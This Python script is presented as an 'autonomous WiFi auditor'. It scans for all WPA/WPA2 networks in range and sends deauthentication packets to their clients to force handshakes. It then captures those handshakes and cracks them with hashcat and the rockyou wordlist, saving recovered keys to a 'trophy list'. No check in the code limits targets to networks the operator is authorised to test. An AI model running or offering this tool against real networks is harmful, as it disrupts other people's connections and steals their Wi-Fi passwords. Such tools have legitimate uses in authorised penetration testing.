import subprocess
import os
import time
import csv
import signal
import sys
import glob
import shutil

# Constants
INTERFACE_DEFAULT = "wlan1"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
SCAN_TIMEOUT = 15  # seconds for initial scan
CAPTURE_TIMEOUT = 60  # seconds for each target capture
DEAUTH_PACKETS = 10
TEMP_DIR = "audit_temp"
HANDSHAKES_DIR = "handshakes"
CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
LOG_FILE = "audit.log"

# Global registry for active processes (for cleanup)
ACTIVE_PROCS = []

def log(message):
    """Logs a message with a timestamp to both stdout and a file."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def run_cmd(cmd, check=True):
    """Executes a command and returns the output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
        return result.stdout
    except subprocess.CalledProcessError as e:
        log(f"Error executing: {cmd}\n{e.stderr}")
        return None

def check_dependencies():
    """Verifies that all required tools are available."""
    tools = ["hashcat", "hcxpcapngtool", "airodump-ng", "aireplay-ng", "timeout", "iwconfig"]
    missing = []
    for tool in tools:
        if shutil.which(tool) is None:
            missing.append(tool)
    if missing:
        log(f"CRITICAL: Missing required tools: {', '.join(missing)}")
        sys.exit(1)
    log("All dependencies verified.")

def check_wordlist():
    """Verifies that the wordlist file exists."""
    if not os.path.exists(WORDLIST):
        log(f"CRITICAL: Wordlist not found at {WORDLIST}")
        sys.exit(1)
    log(f"Wordlist verified: {WORDLIST}")

def cleanup(signum=None, frame=None):
    """Kills all registered active processes and exits."""
    if signum:
        log(f"\nCaught signal {signum}. Cleaning up...")
    
    for proc in ACTIVE_PROCS:
        if proc.poll() is None: # Process is still running
            try:
                # Use SIGINT to allow tools to exit cleanly
                os.kill(proc.pid, signal.SIGINT)
                proc.wait(timeout=5)
            except Exception:
                # Force kill if SIGINT doesn't work
                try:
                    os.kill(proc.pid, signal.SIGTERM)
                except Exception:
                    pass
    
    if signum:
        sys.exit(1)

def get_monitor_interface():
    """Identifies the monitor mode interface, preferring command-line argument."""
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if not arg.startswith("-"):
            log(f"Using user-specified interface: {arg}")
            return arg

    # Look for any interface in Monitor mode using iwconfig
    output = run_cmd("iwconfig 2>/dev/null")
    if output:
        current_iface = None
        for line in output.splitlines():
            if line and not line.startswith(" "):
                current_iface = line.split()[0]
            if current_iface and ("Mode:Monitor" in line or "Mode: Monitor" in line):
                log(f"Detected monitor mode interface: {current_iface}")
                return current_iface

    # Fallbacks
    if os.path.exists("/sys/class/net/wlan1"):
        log("Fallback: Using wlan1")
        return "wlan1"
    if os.path.exists("/sys/class/net/wlan0"):
        log("Fallback: Using wlan0")
        return "wlan0"
                
    log(f"Default fallback: Using {INTERFACE_DEFAULT}")
    return INTERFACE_DEFAULT

def parse_scan_csv(filename):
    """
    Parses the airodump-ng CSV output for targets.
    Handles filename increments and skips headers.
    """
    targets = []
    
    # Handle airodump's -01.csv, -02.csv pattern
    pattern = filename.replace("-01.csv", "-*.csv")
    potential_files = sorted(glob.glob(pattern), reverse=True)
    if not potential_files and os.path.exists(filename):
        potential_files = [filename]
        
    target_file = None
    for f_path in potential_files:
        if os.path.exists(f_path):
            target_file = f_path
            break
            
    if not target_file:
        return targets

    try:
        with open(target_file, mode='r', encoding='utf-8') as f:
            lines = f.readlines()
            
        ap_lines = []
        found_header = False
        for line in lines:
            if not found_header:
                if "BSSID" in line:
                    found_header = True
                    ap_lines.append(line)
                continue
            if line.strip() == "": break
            ap_lines.append(line)

        if not ap_lines: return targets

        reader = csv.DictReader(ap_lines)
        for row in reader:
            bssid = row.get('BSSID', '').strip()
            channel = row.get(' channel', row.get('channel', '')).strip()
            essid = row.get(' ESSID', row.get('ESSID', '')).strip()
            privacy = row.get(' Privacy', row.get('Privacy', '')).strip()
            power = row.get(' Power', row.get('Power', '-100')).strip()
            
            try:
                power_val = int(power)
            except ValueError:
                power_val = -100

            if bssid and channel and "WPA" in privacy:
                targets.append({
                    'bssid': bssid,
                    'channel': channel,
                    'essid': essid,
                    'power': power_val
                })
    except Exception as e:
        log(f"Error parsing scan CSV: {e}")
        
    targets.sort(key=lambda x: x['power'], reverse=True)
    return targets

def get_active_clients(csv_file, target_bssid):
    """Parses the airodump-ng CSV to find clients associated with the target BSSID."""
    clients = []
    if not os.path.exists(csv_file): return clients
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        in_client_section = False
        for line in lines:
            if "Station MAC" in line:
                in_client_section = True
                continue
            if in_client_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 6:
                    client_mac = parts[0].strip()
                    bssid = parts[5].strip()
                    if bssid == target_bssid and client_mac != target_bssid:
                        clients.append(client_mac)
    except Exception:
        pass
    return clients

def has_handshake(cap_file):
    """Checks if the capture file contains a valid handshake."""
    output = run_cmd(f"aircrack-ng {cap_file}", check=False) # Keep aircrack just for quick handshake validation, assuming it's available. If not, we might need an alternative validator. Let's keep it, but it was removed from deps.
    # Actually, if we remove aircrack from deps, we should check with hcxpcapngtool or re-add aircrack to deps.
    # We will re-add aircrack-ng to deps since it's the fastest way to check for a handshake quickly during capture.
    return output and "1 handshake" in output

def main():
    if os.geteuid() != 0:
        print("This script must be run with sudo.")
        sys.exit(1)

    # Register signal handlers
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    log("=== Autonomous WiFi Auditor Initialized ===")
    
    try:
        check_dependencies()
        check_wordlist()

        if not os.path.exists(TEMP_DIR): os.makedirs(TEMP_DIR)
        if not os.path.exists(HANDSHAKES_DIR): os.makedirs(HANDSHAKES_DIR)
        
        interface = get_monitor_interface()

        # Step 1: Initial Scan
        log(f"Phase 1: Starting broad scan ({SCAN_TIMEOUT}s)...")
        scan_id = int(time.time())
        scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
        scan_cmd = f"timeout --signal=SIGINT {SCAN_TIMEOUT}s airodump-ng -w {scan_prefix} --output-format csv {interface} < /dev/null > /dev/null 2>&1"
        run_cmd(scan_cmd, check=False)

        targets = parse_scan_csv(f"{scan_prefix}-01.csv")
        targets = [t for t in targets if t['power'] > -85] # Signal floor

        if not targets:
            log("No capable WPA/WPA2 targets found in range.")
            return

        log(f"Phase 2: Targeted capture starting for {len(targets)} networks...")

        captured_caps = []
        for target in targets:
            clean_essid = "".join([c if c.isalnum() else "_" for c in target['essid']]) or "unknown"
            expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{target['bssid'].replace(':', '')}.cap")
            
            if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
                log(f"Skipping capture: Valid handshake already secured for {target['essid']}.")
                captured_caps.append(expected_save_path)
                continue
                
            log(f"Locking on: {target['essid']} ({target['bssid']}) | PWR: {target['power']} | CH: {target['channel']}")
            
            cap_prefix = os.path.join(TEMP_DIR, f"cap_{target['bssid'].replace(':', '')}")
            # Dynamic Capture: Ask airodump to output both pcap and csv so we can find clients
            dump_cmd = f"timeout --signal=SIGINT {CAPTURE_TIMEOUT}s airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_prefix} --output-format pcap,csv {interface} < /dev/null > /dev/null 2>&1"
            
            dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            ACTIVE_PROCS.append(dump_proc)
            
            # Monitor loop
            start_time = time.time()
            handshake_found = False
            last_deauth = 0
            
            while time.time() - start_time < CAPTURE_TIMEOUT:
                # 1. Check for handshake
                cap_files = glob.glob(f"{cap_prefix}-*.cap")
                if cap_files:
                    current_cap = sorted(cap_files)[-1]
                    if has_handshake(current_cap):
                        log(f"Success! Handshake secured for {target['essid']}.")
                        
                        clean_essid = "".join([c if c.isalnum() else "_" for c in target['essid']]) or "unknown"
                        save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{target['bssid'].replace(':', '')}.cap")
                        shutil.copy(current_cap, save_path)
                        log(f"Capture archived: {save_path}")
                        
                        captured_caps.append(save_path)
                        handshake_found = True
                        cleanup() # Terminate current dump_proc
                        break
                
                # 2. Dynamic Deauth every 15 seconds
                if time.time() - last_deauth > 15:
                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
                    clients = []
                    if csv_files:
                        clients = get_active_clients(sorted(csv_files)[-1], target['bssid'])
                    
                    if clients:
                        for client in set(clients):
                            log(f"Targeted deauth: Prodding client {client} on {target['essid']}...")
                            run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} -c {client} {interface} < /dev/null > /dev/null 2>&1", check=False)
                    else:
                        log(f"No clients seen yet. Sending broadcast deauth to {target['essid']}...")
                        run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
                    
                    last_deauth = time.time()

                time.sleep(2)
            
            if not handshake_found:
                log(f"Incomplete: {target['essid']} remains elusive.")
                cleanup()

        # Step 3: Cracking
        if captured_caps:
            log(f"Phase 3: Initiating single-pass batch crack on {len(captured_caps)} handshakes...")
            # Conversion to Hashcat Format
            batch_hash_file = os.path.join(TEMP_DIR, "batch_hashes.hc22000")
            if os.path.exists(batch_hash_file): os.remove(batch_hash_file)
            
            for cap in captured_caps:
                # hcxpcapngtool appends to the file, which is perfect for batching
                log(f"Converting {os.path.basename(cap)} to hc22000 format...")
                run_cmd(f"hcxpcapngtool -o {batch_hash_file} {cap} < /dev/null > /dev/null 2>&1", check=False)

            if not os.path.exists(batch_hash_file) or os.path.getsize(batch_hash_file) == 0:
                log("Failed to convert captures to hashcat format.")
                return

            # Run Hashcat
            potfile = "wifi_auditor.potfile"
            session_name = "wifi_auditor_session"
            restore_file = f"{session_name}.restore"
            
            # -m 22000: WPA/PBKDF2-PMKID+EAPOL
            # -w 3: High workload profile
            # -O: Optimized kernels
            # -status: Enables automatic status update display
            # -status-timer=1: Updates the status screen every 1 second
            log(f"Unleashing Hashcat on {len(captured_caps)} targets...")
            print("\n" + "="*50)
            print("HANDING OVER TERMINAL TO HASHCAT ENGINE")
            print("="*50 + "\n")
            
            if os.path.exists(restore_file):
                log("Found interrupted Hashcat session. Resuming...")
                crack_cmd = f"hashcat --session {session_name} --restore --status --status-timer=1"
            else:
                crack_cmd = f"hashcat --session {session_name} -m 22000 {batch_hash_file} {WORDLIST} -w 3 -O --potfile-path {potfile} --status --status-timer=1"
            
            try:
                # Use subprocess.call without capturing output to allow hashcat to draw directly to the TTY
                subprocess.call(crack_cmd, shell=True)
            except KeyboardInterrupt:
                print("\n[SYSTEM] Hashcat run interrupted manually.")
            
            print("\n" + "="*50)
            print("HASHCAT ENGINE FINISHED - RESUMING SCRIPT")
            print("="*50 + "\n")
            
            cracked_count = 0
            
            # Read already cracked passwords to avoid duplicates
            known_cracks = set()
            if os.path.exists(CRACKED_PASSWORDS_FILE):
                with open(CRACKED_PASSWORDS_FILE, "r") as f:
                    for line in f:
                        if " | Key: " in line:
                            # Try to extract ESSID and Key for deduplication
                            try:
                                known_cracks.add(line.split(" | ")[1] + line.split(" | Key: ")[1].strip())
                            except IndexError:
                                pass

            if os.path.exists(potfile):
                with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
                    with open(potfile, "r") as pf:
                        for line in pf:
                            line = line.strip()
                            if not line: continue
                            # Format usually: hash:MAC_AP:MAC_CLIENT:ESSID:PASSWORD
                            parts = line.split(":")
                            if len(parts) >= 5:
                                # The ESSID is the second to last part, and PASSWORD is the last part
                                # This handles cases where the password contains colons
                                essid_hex = parts[-2]
                                password = parts[-1]
                                try:
                                    essid = bytes.fromhex(essid_hex).decode('utf-8', 'ignore')
                                except Exception:
                                    essid = essid_hex
                                
                                dup_key = essid + password
                                if dup_key not in known_cracks:
                                    log(f"VICTORY! [{essid}] Key found: {password}")
                                    cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | Key: {password}\n")
                                    cpf.flush()
                                    known_cracks.add(dup_key)
                                    cracked_count += 1
                                
            log(f"Batch assault complete. Passwords recovered: {cracked_count}.")
            log(f"Trophy list available at: {CRACKED_PASSWORDS_FILE}")
        else:
            log("No handshakes were secured during this foray.")

    finally:
        cleanup()
        log("=== Audit Session Concluded ===")

if __name__ == "__main__":
    if os.environ.get("WIFI_AUDITOR_INHIBITED") != "1":
        # Relaunch with systemd-inhibit
        print("[SYSTEM] Engaging Wake Lock to prevent sleep...")
        cmd = [
            "systemd-inhibit",
            "--what=sleep:idle",
            "--who=WiFi Auditor",
            "--why=Running long security audit",
            sys.executable
        ] + sys.argv
        
        env = os.environ.copy()
        env["WIFI_AUDITOR_INHIBITED"] = "1"
        
        try:
            # Replace current process with the inhibited one
            result = subprocess.run(cmd, env=env)
            sys.exit(result.returncode)
        except FileNotFoundError:
            print("[SYSTEM] systemd-inhibit not found. Wake lock disabled. Running normally...")
            main()
        except KeyboardInterrupt:
            sys.exit(130)
    else:
        main()
